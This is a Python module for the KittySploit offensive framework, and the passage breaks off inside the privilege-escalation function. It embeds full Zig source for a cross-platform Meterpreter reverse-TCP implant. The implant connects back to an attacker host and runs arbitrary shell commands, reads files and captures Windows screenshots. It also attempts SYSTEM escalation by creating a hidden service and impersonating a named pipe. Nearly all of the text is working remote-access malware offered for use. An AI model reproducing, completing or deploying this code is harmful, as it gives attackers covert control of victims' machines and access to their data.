#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zig Meterpreter Reverse TCP Payload
Author: KittySploit Team
Version: 1.1.0

This payload generates a Zig-based Meterpreter client that can be compiled
cross-platform. Zig allows easy cross-compilation for multiple architectures
and operating systems.

REQUIREMENT: Zig compiler must be installed on the attacker machine
The compiled binary can run on the target without any dependencies!
"""

from kittysploit import *
import os
import subprocess
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Zig Meterpreter, Reverse TCP',
        'description': 'Meterpreter payload in Zig - cross-platform compilation (requires Zig compiler)',
        'author': 'KittySploit Team',
        'version': '1.1.0',
        'category': 'singles',
        'platform': Platform.UNIX,
        'arch': Arch.X64,
        'listener': 'listeners/multi/meterpreter',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://ziglang.org/',
            'https://ziglang.org/documentation/master/#Cross-compilation-is-a-first-class-use-case'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    target_os = OptChoice('linux', 'Target operating system', True, 
                         ['linux', 'windows', 'macos', 'freebsd', 'netbsd', 'openbsd', 'dragonfly'])
    target_arch = OptChoice('x86_64', 'Target architecture', True,
                            ['x86_64', 'x86', 'aarch64', 'arm', 'mips', 'mips64', 'riscv64', 'wasm32'])
    optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
                           ['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    
    # Zig source code embedded in the module
    ZIG_SOURCE_CODE = r"""
const std = @import("std");
const json = std.json;
const os = std.os;
const posix = std.posix;
const process = std.process;
const mem = std.mem;
const fmt = std.fmt;
const builtin = @import("builtin");
const ArrayList = std.array_list;

const SOCKADDR_IN = extern struct {
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
};

const MeterpreterClient = struct {
    host: []const u8,
    port: u16,
    socket_fd: ?usize = null,
    current_dir: []const u8,
    is_root: bool,
    username: []const u8,
    hostname: []const u8,
    allocator: std.mem.Allocator,

    const Self = @This();

    pub fn init(allocator: std.mem.Allocator, host: []const u8, port: u16) !Self {
        var self = Self{
            .host = host,
            .port = port,
            .current_dir = "",
            .is_root = false,
            .username = "user",
            .hostname = "localhost",
            .allocator = allocator,
        };
        
        const cwd = try process.getCwdAlloc(allocator);
        self.current_dir = cwd;

        if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) {
            self.is_root = (posix.getuid() == 0);
        }

        if (builtin.target.os.tag == .windows) {
            if (process.getEnvVarOwned(allocator, "USERNAME")) |username| {
                self.username = username;
            } else |_| {}
            if (process.getEnvVarOwned(allocator, "COMPUTERNAME")) |hostname| {
                self.hostname = hostname;
            } else |_| {}
        } else {
            if (posix.getenv("USER")) |user| {
                self.username = try allocator.dupe(u8, user);
            }
            if (posix.getenv("HOSTNAME")) |hostname| {
                self.hostname = try allocator.dupe(u8, hostname);
            }
        }

        return self;
    }

    pub fn connect(self: *Self) !void {
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            
            var wsa_data: ws2_32.WSADATA = undefined;
            if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {
                return error.ConnectionFailed;
            }
            
            const sock = ws2_32.socket(2, 1, 0);
            if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
            
            var host_buf: [256]u8 = undefined;
            if (self.host.len >= host_buf.len) return error.InvalidAddress;
            @memcpy(host_buf[0..self.host.len], self.host);
            host_buf[self.host.len] = 0;
            
            var addr: SOCKADDR_IN = .{
                .family = 2,
                .port = ws2_32.htons(self.port),
                .addr = ws2_32.inet_addr(&host_buf),
                .zero = [_]u8{0} ** 8,
            };
            
            if (ws2_32.connect(
                sock,
                @ptrCast(&addr),
                @sizeOf(SOCKADDR_IN),
            ) != 0) {
                return error.ConnectionFailed;
            }
            
            self.socket_fd = @intFromPtr(sock);
        } else {
            const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
            errdefer posix.close(sock);
            
            var addr: posix.sockaddr.in = undefined;
            addr.family = posix.AF.INET;
            addr.port = @byteSwap(self.port);
            
            var ip_parts: [4]u8 = undefined;
            var part_idx: usize = 0;
            var current: u32 = 0;
            for (self.host) |c| {
                if (c == '.') {
                    if (part_idx >= 4) return error.InvalidAddress;
                    ip_parts[part_idx] = @intCast(current);
                    part_idx += 1;
                    current = 0;
                } else if (c >= '0' and c <= '9') {
                    current = current * 10 + (c - '0');
                } else {
                    return error.InvalidAddress;
                }
            }
            if (part_idx != 3) return error.InvalidAddress;
            ip_parts[3] = @intCast(current);
            
            const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) | 
                                 (@as(u32, ip_parts[1]) << 16) | 
                                 (@as(u32, ip_parts[2]) << 8) | 
                                 @as(u32, ip_parts[3]);
            addr.addr = @byteSwap(ip_addr);
            
            try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
            self.socket_fd = @intCast(sock);
        }
    }

    pub fn sendResponse(self: *Self, output: []const u8, status: i32, err_msg: []const u8) !void {
        if (self.socket_fd == null) return;

        // Manually build JSON response for compatibility with Zig 0.15.x
        // Format: {"output":"...","status":N,"error":"..."}
        var response_list = ArrayList.Managed(u8).init(self.allocator);
        defer response_list.deinit();
        
        try response_list.appendSlice("{\"output\":\"");
        // Escape special characters in output
        for (output) |c| {
            switch (c) {
                '"' => try response_list.appendSlice("\\\""),
                '\\' => try response_list.appendSlice("\\\\"),
                '\n' => try response_list.appendSlice("\\n"),
                '\r' => try response_list.appendSlice("\\r"),
                '\t' => try response_list.appendSlice("\\t"),
                else => {
                    if (c < 0x20) {
                        // Control character - encode as \u00XX
                        try response_list.appendSlice("\\u00");
                        const hex = "0123456789abcdef";
                        try response_list.append(hex[c >> 4]);
                        try response_list.append(hex[c & 0x0f]);
                    } else {
                        try response_list.append(c);
                    }
                },
            }
        }
        try response_list.appendSlice("\",\"status\":");
        
        // Convert status to string
        var status_buf: [12]u8 = undefined;
        const status_str = std.fmt.bufPrint(&status_buf, "{d}", .{status}) catch "0";
        try response_list.appendSlice(status_str);
        
        try response_list.appendSlice(",\"error\":\"");
        // Escape special characters in error message
        for (err_msg) |c| {
            switch (c) {
                '"' => try response_list.appendSlice("\\\""),
                '\\' => try response_list.appendSlice("\\\\"),
                '\n' => try response_list.appendSlice("\\n"),
                '\r' => try response_list.appendSlice("\\r"),
                '\t' => try response_list.appendSlice("\\t"),
                else => {
                    if (c < 0x20) {
                        try response_list.appendSlice("\\u00");
                        const hex = "0123456789abcdef";
                        try response_list.append(hex[c >> 4]);
                        try response_list.append(hex[c & 0x0f]);
                    } else {
                        try response_list.append(c);
                    }
                },
            }
        }
        try response_list.appendSlice("\"}");
        
        const response_bytes = response_list.items;
        
        var length_buf: [4]u8 = undefined;
        mem.writeInt(u32, &length_buf, @intCast(response_bytes.len), .big);

        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            _ = ws2_32.send(sock, &length_buf, 4, 0);
            _ = ws2_32.send(sock, response_bytes.ptr, @intCast(response_bytes.len), 0);
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            _ = try posix.send(fd, &length_buf, 0);
            _ = try posix.send(fd, response_bytes, 0);
        }
    }

    pub fn receiveCommand(self: *Self) !?CommandParsed {
        if (self.socket_fd == null) return null;

        var length_bytes: [4]u8 = undefined;
        var bytes_read: usize = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = ws2_32.recv(sock, length_bytes[bytes_read..].ptr, @intCast(4 - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) return error.ConnectionFailed;
                if (n == 0) return null;
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < 4) {
                const n = try posix.recv(fd, length_bytes[bytes_read..], 0);
                if (n == 0) return null;
                bytes_read += n;
            }
        }
        const length = mem.readInt(u32, &length_bytes, .big);

        // Allocate buffer for command data - this will be owned by CommandParsed
        const command_data = try self.allocator.alloc(u8, length);
        errdefer self.allocator.free(command_data);
        
        bytes_read = 0;
        if (builtin.target.os.tag == .windows) {
            const ws2_32 = os.windows.ws2_32;
            const sock = @as(ws2_32.SOCKET, @ptrFromInt(self.socket_fd.?));
            while (bytes_read < length) {
                const n = ws2_32.recv(sock, command_data[bytes_read..].ptr, @intCast(length - bytes_read), 0);
                if (n == ws2_32.SOCKET_ERROR) {
                    self.allocator.free(command_data);
                    return error.ConnectionFailed;
                }
                if (n == 0) {
                    self.allocator.free(command_data);
                    return null;
                }
                bytes_read += @intCast(n);
            }
        } else {
            const fd = @as(posix.fd_t, @intCast(self.socket_fd.?));
            while (bytes_read < length) {
                const n = try posix.recv(fd, command_data[bytes_read..], 0);
                if (n == 0) {
                    self.allocator.free(command_data);
                    return null;
                }
                bytes_read += n;
            }
        }

        const parsed = try json.parseFromSlice(Command, self.allocator, command_data, .{ .ignore_unknown_fields = true });
        
        // Return wrapper that owns both the buffer and parsed data
        return CommandParsed{
            .parsed = parsed,
            .buffer = command_data,
            .allocator = self.allocator,
        };
    }

    pub fn executeCommand(self: *Self, cmd: []const u8, args: []const []const u8, command_line: ?[]const u8) !CommandResult {
        if (mem.eql(u8, cmd, "sysinfo")) {
            return self.cmdSysinfo();
        } else if (mem.eql(u8, cmd, "getuid")) {
            return self.cmdGetuid();
        } else if (mem.eql(u8, cmd, "getpid")) {
            return self.cmdGetpid();
        } else if (mem.eql(u8, cmd, "pwd")) {
            return self.cmdPwd();
        } else if (mem.eql(u8, cmd, "cd")) {
            return self.cmdCd(args);
        } else if (mem.eql(u8, cmd, "ls") or mem.eql(u8, cmd, "dir")) {
            return self.cmdLs(args);
        } else if (mem.eql(u8, cmd, "cat") or mem.eql(u8, cmd, "type")) {
            return self.cmdCat(args);
        } else if (mem.eql(u8, cmd, "ps")) {
            return self.cmdPs();
        } else if (mem.eql(u8, cmd, "shell")) {
            return self.cmdShell(args, command_line);
        } else if (mem.eql(u8, cmd, "screenshot")) {
            return self.cmdScreenshot();
        } else if (mem.eql(u8, cmd, "getsystem")) {
            return self.cmdGetsystem();
        } else {
            return self.cmdExecute(args);
        }
    }

    fn cmdSysinfo(self: *Self) !CommandResult {
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();

        try appendFmt(self.allocator, &output, "Computer\t\t: {s}\n", .{self.hostname});
        try appendFmt(self.allocator, &output, "OS\t\t\t: {s}\n", .{@tagName(builtin.target.os.tag)});
        try appendFmt(self.allocator, &output, "Architecture\t\t: {s}\n", .{@tagName(builtin.target.cpu.arch)});
        try appendFmt(self.allocator, &output, "Meterpreter\t\t: Zig\n", .{});
        try appendFmt(self.allocator, &output, "Zig Version\t\t: {s}\n", .{"0.16.0-dev"});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetuid(self: *Self) !CommandResult {
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();

        const uid: u32 = if (builtin.target.os.tag == .linux or builtin.target.os.tag == .macos) 
            posix.getuid() 
        else 
            1000;
        try appendFmt(self.allocator, &output, "Server username: {s} ({d})\n", .{ self.username, uid });

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdGetpid(self: *Self) !CommandResult {
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();

        const pid: i32 = if (builtin.target.os.tag == .windows) 
            @intCast(os.windows.GetCurrentProcessId())
        else
            @intCast(posix.getpid());
        try appendFmt(self.allocator, &output, "Current pid: {d}\n", .{pid});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdPwd(self: *Self) !CommandResult {
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();

        try appendFmt(self.allocator, &output, "{s}\n", .{self.current_dir});

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCd(self: *Self, args: []const []const u8) !CommandResult {
        var target_dir: []const u8 = undefined;
        var target_dir_owned: ?[]u8 = null;
        defer if (target_dir_owned) |td| self.allocator.free(td);
        
        if (args.len == 0) {
            if (builtin.target.os.tag == .windows) {
                if (process.getEnvVarOwned(self.allocator, "USERPROFILE")) |home| {
                    target_dir_owned = home;
                    target_dir = target_dir_owned.?;
                } else |_| {
                    target_dir = "C:\\Users";
                }
            } else {
                if (posix.getenv("HOME")) |home| {
                    target_dir = home;
                } else {
                    target_dir = "/tmp";
                }
            }
        } else {
            target_dir = args[0];
        }

        const absolute_target = if (std.fs.path.isAbsolute(target_dir))
            try self.allocator.dupe(u8, target_dir)
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir });
        defer self.allocator.free(absolute_target);

        std.fs.cwd().access(absolute_target, .{}) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cd: {s}: No such file or directory", .{absolute_target}),
            };
        };

        self.allocator.free(self.current_dir);
        self.current_dir = try self.allocator.dupe(u8, absolute_target);
        return CommandResult{
            .output = "",
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdLs(self: *Self, args: []const []const u8) !CommandResult {
        const target_dir_raw = if (args.len == 0) self.current_dir else args[0];
        const target_dir = if (std.fs.path.isAbsolute(target_dir_raw))
            target_dir_raw
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, target_dir_raw });
        defer if (!std.fs.path.isAbsolute(target_dir_raw)) self.allocator.free(target_dir);

        var dir = std.fs.cwd().openDir(target_dir, .{ .iterate = true }) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "ls: {s}: No such file or directory", .{target_dir}),
            };
        };
        defer dir.close();

        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();

        var iter = dir.iterate();
        while (try iter.next()) |entry| {
            const name = entry.name;
            if (entry.kind == .directory) {
                try appendFmt(self.allocator, &output, "{s}/\n", .{name});
            } else {
                try appendFmt(self.allocator, &output, "{s}\n", .{name});
            }
        }

        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdCat(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try self.allocator.dupe(u8, "Usage: cat <file>"),
            };
        }

        const file_path = if (std.fs.path.isAbsolute(args[0]))
            args[0]
        else
            try std.fs.path.resolve(self.allocator, &[_][]const u8{ self.current_dir, args[0] });
        defer if (!std.fs.path.isAbsolute(args[0])) self.allocator.free(file_path);

        const content = std.fs.cwd().readFileAlloc(self.allocator, file_path, 10 * 1024 * 1024) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "cat: {s}: No such file or error reading", .{file_path}),
            };
        };

        return CommandResult{
            .output = content,
            .status = 0,
            .error_msg = "",
        };
    }

    fn readFromPipe(self: *Self, file: std.fs.File) ![]u8 {
        var buffer = ArrayList.Managed(u8).init(self.allocator);
        defer buffer.deinit();
        var read_buf: [4096]u8 = undefined;
        var reader_buf: [4096]u8 = undefined;
        var r = file.readerStreaming(&reader_buf);
        while (true) {
            var bufs: [1][]u8 = .{read_buf[0..]};
            const n = r.interface.vtable.readVec(&r.interface, bufs[0..]) catch |err| {
                if (err == error.EndOfStream) break;
                return err;
            };
            if (n == 0) break;
            try buffer.appendSlice(read_buf[0..n]);
        }
        return try buffer.toOwnedSlice();
    }

    fn cmdExecute(self: *Self, args: []const []const u8) !CommandResult {
        if (args.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try self.allocator.dupe(u8, "Usage: execute <command>"),
            };
        }

        var cmd_args = ArrayList.Managed([]const u8).init(self.allocator);
        defer cmd_args.deinit();

        if (builtin.target.os.tag == .windows) {
            try cmd_args.append("cmd.exe");
            try cmd_args.append("/c");
            try cmd_args.append(args[0]);
        } else {
            try cmd_args.append("/bin/sh");
            try cmd_args.append("-c");
            try cmd_args.append(args[0]);
        }
        
        var child = std.process.Child.init(cmd_args.items, self.allocator);
        child.cwd = self.current_dir;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        
        try child.spawn();
        
        const stdout = if (child.stdout) |f| try self.readFromPipe(f) else "";
        defer if (stdout.len > 0) self.allocator.free(stdout);
        
        const stderr = if (child.stderr) |f| try self.readFromPipe(f) else "";
        defer if (stderr.len > 0) self.allocator.free(stderr);
        
        const term = try child.wait();
        const exit_code: i32 = switch (term) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        // Combine stdout and stderr
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();
        if (stdout.len > 0) {
            try output.appendSlice(stdout);
        }
        if (stderr.len > 0) {
            if (stdout.len > 0) try output.append('\n');
            try output.appendSlice(stderr);
        }
        
        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = exit_code,
            .error_msg = "",
        };
    }

    fn cmdPs(self: *Self) !CommandResult {
        return self.cmdExecute(&[_][]const u8{ if (builtin.target.os.tag == .windows) "tasklist" else "ps aux" });
    }

    fn cmdShell(self: *Self, args: []const []const u8, command_line: ?[]const u8) !CommandResult {
        // Shell command: execute shell with provided command, or open interactive shell
        // Prefer command_line (full string from Python) to avoid args parsing issues
        const full_cmd: []const u8 = if (command_line) |line| line else blk: {
            if (args.len == 0) {
                return CommandResult{
                    .output = try self.allocator.dupe(u8, "Shell opened. Use 'execute <command>' to run commands, or 'shell <command>' to execute in shell.\n"),
                    .status = 0,
                    .error_msg = "",
                };
            }
            var cmd_str = ArrayList.Managed(u8).init(self.allocator);
            defer cmd_str.deinit();
            for (args, 0..) |arg, i| {
                if (i > 0) try cmd_str.append(' ');
                try cmd_str.appendSlice(arg);
            }
            break :blk try cmd_str.toOwnedSlice();
        };
        defer if (command_line == null and args.len > 0) self.allocator.free(full_cmd);

        var cmd_args = ArrayList.Managed([]const u8).init(self.allocator);
        defer cmd_args.deinit();

        if (builtin.target.os.tag == .windows) {
            try cmd_args.append("cmd.exe");
            try cmd_args.append("/c");
            try cmd_args.append(full_cmd);
        } else {
            try cmd_args.append("/bin/sh");
            try cmd_args.append("-c");
            try cmd_args.append(full_cmd);
        }
        
        var child = std.process.Child.init(cmd_args.items, self.allocator);
        child.cwd = self.current_dir;
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        
        try child.spawn();
        
        const stdout = if (child.stdout) |f| try self.readFromPipe(f) else "";
        defer if (stdout.len > 0) self.allocator.free(stdout);
        
        const stderr = if (child.stderr) |f| try self.readFromPipe(f) else "";
        defer if (stderr.len > 0) self.allocator.free(stderr);
        
        const term = try child.wait();
        const exit_code: i32 = switch (term) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        // Combine stdout and stderr
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();
        if (stdout.len > 0) {
            try output.appendSlice(stdout);
        }
        if (stderr.len > 0) {
            if (stdout.len > 0) try output.append('\n');
            try output.appendSlice(stderr);
        }
        
        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = exit_code,
            .error_msg = "",
        };
    }

    fn cmdScreenshot(self: *Self) !CommandResult {
        if (builtin.target.os.tag == .windows) {
            return self.cmdScreenshotWindows();
        } else if (builtin.target.os.tag == .linux) {
            return self.cmdScreenshotLinux();
        } else if (builtin.target.os.tag == .macos) {
            return self.cmdScreenshotMacOS();
        } else {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "Screenshot not supported on {s}", .{@tagName(builtin.target.os.tag)}),
            };
        }
    }

    fn cmdScreenshotWindows(self: *Self) !CommandResult {
        // Use PowerShell to capture screenshot (simpler than direct Windows API calls)
        // PowerShell command that captures screen and outputs base64 PNG
        const ps_cmd = 
            \\Add-Type -AssemblyName System.Drawing,System.Windows.Forms;
            \\$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen;
            \\$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height;
            \\$graphics = [System.Drawing.Graphics]::FromImage($bmp);
            \\$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size);
            \\$ms = New-Object System.IO.MemoryStream;
            \\$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png);
            \\$bytes = $ms.ToArray();
            \\$base64 = [Convert]::ToBase64String($bytes);
            \\Write-Output $base64;
            \\$graphics.Dispose();
            \\$bmp.Dispose();
            \\$ms.Dispose();
        ;
        
        // Execute PowerShell command
        var cmd_args = ArrayList.Managed([]const u8).init(self.allocator);
        defer cmd_args.deinit();
        
        try cmd_args.append("powershell.exe");
        try cmd_args.append("-Command");
        try cmd_args.append(ps_cmd);
        
        var child = std.process.Child.init(cmd_args.items, self.allocator);
        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;
        
        try child.spawn();
        
        const stdout = if (child.stdout) |f| try self.readFromPipe(f) else "";
        defer if (stdout.len > 0) self.allocator.free(stdout);
        
        const stderr = if (child.stderr) |f| try self.readFromPipe(f) else "";
        defer if (stderr.len > 0) self.allocator.free(stderr);
        
        const term = try child.wait();
        const exit_code: i32 = switch (term) {
            .Exited => |code| @intCast(code),
            else => 1,
        };
        
        if (exit_code != 0 or stdout.len == 0) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "PowerShell screenshot failed. stderr: {s}", .{stderr}),
            };
        }
        
        // Remove any whitespace/newlines from base64 output
        var base64_clean = ArrayList.Managed(u8).init(self.allocator);
        defer base64_clean.deinit();
        
        for (stdout) |c| {
            if (c != '\n' and c != '\r' and c != ' ' and c != '\t') {
                try base64_clean.append(c);
            }
        }
        
        const base64_encoded = try base64_clean.toOwnedSlice();
        defer self.allocator.free(base64_encoded);
        
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();
        
        try appendFmt(self.allocator, &output, "[*] Screenshot captured via PowerShell\n", .{});
        try appendFmt(self.allocator, &output, "[*] Base64 PNG data length: {d} bytes\n", .{base64_encoded.len});
        
        // Include base64 data in output
        const preview_len = if (base64_encoded.len > 100) 100 else base64_encoded.len;
        try appendFmt(self.allocator, &output, "[*] Base64 preview: {s}...\n", .{base64_encoded[0..preview_len]});
        
        // Store full base64 data - append it to output
        try output.appendSlice("\n[SCREENSHOT_DATA_START]\n");
        try output.appendSlice(base64_encoded);
        try output.appendSlice("\n[SCREENSHOT_DATA_END]\n");
        
        return CommandResult{
            .output = try output.toOwnedSlice(),
            .status = 0,
            .error_msg = "",
        };
    }

    fn cmdScreenshotLinux(self: *Self) !CommandResult {
        // Linux: Use X11 API or framebuffer
        // For simplicity, we'll use framebuffer /dev/fb0
        const fb_path = "/dev/fb0";
        
        const fb_file = std.fs.cwd().openFile(fb_path, .{ .mode = .read_only }) catch {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "Failed to open framebuffer: {s}. X11 screenshot not yet implemented.", .{fb_path}),
            };
        };
        defer fb_file.close();
        
        // Read framebuffer info (simplified - would need proper ioctl in production)
        // For now, return error suggesting X11 implementation
        return CommandResult{
            .output = "",
            .status = 1,
            .error_msg = try std.fmt.allocPrint(self.allocator, "Linux screenshot via framebuffer not fully implemented. X11 API required."),
        };
    }

    fn cmdScreenshotMacOS(self: *Self) !CommandResult {
        // macOS: Use CoreGraphics API
        // This requires linking against CoreGraphics framework
        return CommandResult{
            .output = "",
            .status = 1,
            .error_msg = try std.fmt.allocPrint(self.allocator, "macOS screenshot via CoreGraphics not yet implemented."),
        };
    }

    fn cmdGetsystem(self: *Self) !CommandResult {
        if (builtin.target.os.tag != .windows) {
            return CommandResult{
                .output = "",
                .status = 1,
                .error_msg = try std.fmt.allocPrint(self.allocator, "getsystem is only supported on Windows"),
            };
        }
        
        // Check current privileges first
        const ps_check_cmd = 
            \\$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent();
            \\$principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser);
            \\$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator);
            \\$isSystem = $currentUser.Name -like "*SYSTEM*" -or $currentUser.Name -eq "NT AUTHORITY\\SYSTEM";
            \\if ($isSystem) {
            \\    Write-Output "Already running as SYSTEM";
            \\    exit 0;
            \\}
            \\if (-not $isAdmin) {
            \\    Write-Output "Not running as administrator. getsystem requires admin privileges.";
            \\    exit 1;
            \\}
            \\Write-Output "Running as administrator, attempting to get SYSTEM...";
        ;
        
        // Try Named Pipe Impersonation technique (Metasploit's primary method)
        const ps_getsystem_cmd = 
            \\$ErrorActionPreference = "Stop";
            \\try {
            \\    # Generate random names
            \\    $pipeName = "\\\\.\\pipe\\" + [System.Guid]::NewGuid().ToString();
            \\    $serviceName = "Kittysploit_" + [System.Guid]::NewGuid().ToString().Substring(0, 8);
            \\    
            \\    # Create named pipe server with impersonation
            \\    $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None, 0, 0);
            \\    
            \\    # Create service script that connects to pipe
            \\    $scriptContent = @"
            \\        `$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "$pipeName", [System.IO.Pipes.PipeDirection]::InOut);
            \\        `$pipe.Connect(5000);
            \\        Start-Sleep -Seconds 1;
            \\        `$pipe.Close();
            \\"@;
            \\    
            \\    $scriptPath = Join-Path $env:TEMP "$serviceName.ps1";
            \\    $scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII -Force;
            \\    
            \\    # Create and start service
            \\    $binPath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"";
            \\    $createCmd = "sc.exe create $serviceName binPath= `"$binPath`" start= demand";
            \\    $createResult = cmd.exe /c $createCmd 2>&1 | Out-String;
            \\    
            \\    if ($LASTEXITCODE -eq 0) {
            \\        Start-Sleep -Milliseconds 500;
            \\        $startResult = cmd.exe /c "sc.exe start $serviceName" 2>&1 | Out-String;
            \\        
            \\        # Wait for connection (service runs as SYSTEM)
            \\        $connected = $false;
            \\        $timeout = [DateTime]::Now.AddSeconds(5);
            \\        while ([DateTime]::Now -lt $timeout) {
            \\            if ($pipe.IsConnected) {
            \\                $connected = $true;
            \\                break;
            \\            }
            \\            Start-Sleep -Milliseconds 100;
            \\        }
            \\        
            \\        if ($connected) {
            \\            # Impersonate the SYSTEM token
            \\            $pipe.RunAsClient({
            \\                $newUser = [System.Security.Principal.WindowsIdentity]::GetCurrent();
            \\                if ($newUser.Name -like "*SYSTEM*" -or $newUser.Name -eq "NT AUTHORITY\\SYSTEM") {
            \\                    Write-Output "SUCCESS: Got SYSTEM privileges via Named Pipe Impersonation";
            \\                    Write-Output "Current user: " + $newUser.Name;
            \\                } else {
            \\                    Write-Output "PARTIAL: Impersonated but not SYSTEM: " + $newUser.Name;
            \\                }
            \\            });
            \\        } else {
            \\            Write-Output "FAILED: Service did not connect to pipe";
            \\        }
            \\        
            \\        $pipe.Close();
            \\        
            \\        # Cleanup
            \\        cmd.exe /c "sc.exe stop $serviceName" 2>&1 | Out-Null;
            \\        cmd.exe /c "sc.exe delete $serviceName" 2>&1 | Out-Null;
            \\        Remove-Item $scriptPath -ErrorAction SilentlyContinue;
            \\    } else {
            \\        Write-Output "FAILED: Could not create service: $createResult";
            \\        Write-Output "Note: This requires administrator privileges.";
            \\    }
            \\} catch {
            \\    Write-Output "FAILED: " + $_.Exception.Message;
            \\}
        ;
        
        // First check current privileges
        var check_args = ArrayList.Managed([]const u8).init(self.allocator);
        defer check_args.deinit();
        try check_args.append("powershell.exe");
        try check_args.append("-Command");
        try check_args.append(ps_check_cmd);
        
        var check_child = std.process.Child.init(check_args.items, self.allocator);
        check_child.stdout_behavior = .Pipe;
        check_child.stderr_behavior = .Pipe;
        try check_child.spawn();
        
        const check_stdout = if (check_child.stdout) |f| try self.readFromPipe(f) else "";
        defer if (check_stdout.len > 0) self.allocator.free(check_stdout);
        const check_stderr = if (check_child.stderr) |f| try self.readFromPipe(f) else "";
        defer if (check_stderr.len > 0) self.allocator.free(check_stderr);
        _ = try check_child.wait();
        
        var output = ArrayList.Managed(u8).init(self.allocator);
        defer output.deinit();
        
        if (check_stdout.len > 0) {
            try output.appendSlice(check_stdout);
        }
        
        // Check if already SYSTEM
        if (mem.indexOf(u8, check_stdout, "Already running as SYSTEM") != null) {
            self.is_root = true;
            self.username = try self.allocator.dupe(u8, "SYSTEM");
            try appendFmt(self.allocator, &output, "\n[*] Already running as SYSTEM\n", .{});
            return CommandResult{
                .output = try output.toOwnedSlice(),
                .status = 0,
                .error_msg = "",
            };
        }
        
        // Check if not admin
        if (mem.indexOf(u8, check_stdout, "Not running as administrator") != null) {
            try appendFmt(self.allocator, &output, "\n[!] Not running as administrator. getsystem requires admin privileges.\n", .{});
            return CommandResult{
                .output = try output.toOwnedSlice(),
                .status = 1,
                .error_msg = "",
            };
        }
        
        // Try to get SYSTEM
